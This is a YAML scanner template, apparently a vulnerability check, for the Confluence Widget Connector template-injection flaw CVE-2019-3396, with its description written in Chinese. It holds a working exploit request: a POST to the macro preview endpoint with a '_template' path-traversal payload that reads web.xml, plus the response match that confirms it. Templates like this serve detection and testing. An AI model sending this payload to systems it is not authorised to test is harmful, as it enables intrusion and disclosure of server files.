app: Atlassian Confluence
query: app:"Atlassian Confluence"
meta:
  name: 'Confluence 未授权 RCE (CVE-2019-3396)'
  level: 4
  tags:
    - path_traversal
    - remote_code_execution
  description: Confluence Server与Confluence Data Center中的Widget Connector存在服务端模板注入漏洞，攻击者能利用此漏洞能够实现目录穿越与远程代码执行。
  homepage: https://www.atlassian.com/software/confluence
  author: 一曲成殇
  references: https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396
  solution: 升级系统版本
  steps:
    verify_steps:
      type: and
      verify:
        - request:
            method: POST
            path: /rest/tinymce/1/macro/preview
            redirect: true
            header:
              - User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6
              - Content-Type: application/json
            params: '{"contentId": "786458", "macro":{"name": "widget", "body":"", "params":{"url": "https://www.viddler.com/v/23464dc6", "width": "1000"," height": "1000","_template":". /web.xml"}}}'
          response:
            - name: code
              value: "200"
              type: equals
            - name: body
              value: <param-name>contextConfigLocation</param-name>
              type: contains
  create_at: "2021-11-06 18:22:16"
